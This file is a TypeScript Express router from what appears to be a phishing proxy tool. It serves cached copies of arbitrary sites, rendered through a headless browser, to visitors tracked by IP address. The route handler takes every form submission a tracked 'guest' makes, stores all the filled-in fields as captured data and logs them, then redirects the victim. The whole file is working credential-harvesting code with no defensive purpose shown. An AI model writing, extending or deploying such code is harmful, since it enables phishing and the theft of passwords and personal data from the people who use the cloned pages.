import { Router } from 'express'
import * as Path from 'path'

import { Guest, Setting } from '../datastore'
import { httpify, isValidUrl } from '../utils'
import { BASE_DIR } from '../constants'
import log from '../../bin/logger'


const router = Router()
const cacheDir = Path.join(BASE_DIR, 'cache')

router.all('*', async (req, resp) => {
    if (/^\/*.jpg$|png$|ico$|gif$/.test(req.url) || !req.url.trim()) return resp.sendStatus(200)
    const { redirect, hook } = req.query
    const post = req.method.toLowerCase() === 'post'
    let link = httpify(decodeURIComponent(req.url.slice(1)))
    const setting:Setting = await Setting.findOne({})
    const ip = req.header('x-forwarded-for') || req.connection.remoteAddress
    const { browser } = resp.locals
    const guest:Guest = await Guest.findOne({ ip })

    if (guest) {
        if (post && !link.startsWith(setting.defaultLink)) {
            /* Storing in arrays intentionally, nedb-models fails with nested lengthy objects 🤷‍♂️ */
            const chunks = Object
                .entries(req.body)
                .filter(([key, value]) => !!value)
                .map(([key, value]) => `${key}: ${value}`)

            log(guest, `guest's form submission was captured:`, chunks)
            if (chunks.length) guest.posts.push({path: link, date: new Date(), data: chunks})
        }
        await guest.store()
    }

    if (post && redirect) resp.redirect(hook === 'true' ? redirect : `/${redirect}`)
    else {
        if (!isValidUrl(link)) link = setting.defaultLink
        return resp.status(200)
            .sendFile(Path.join(cacheDir, await browser.get(link, req.headers, ip)))
    }
})


export default router
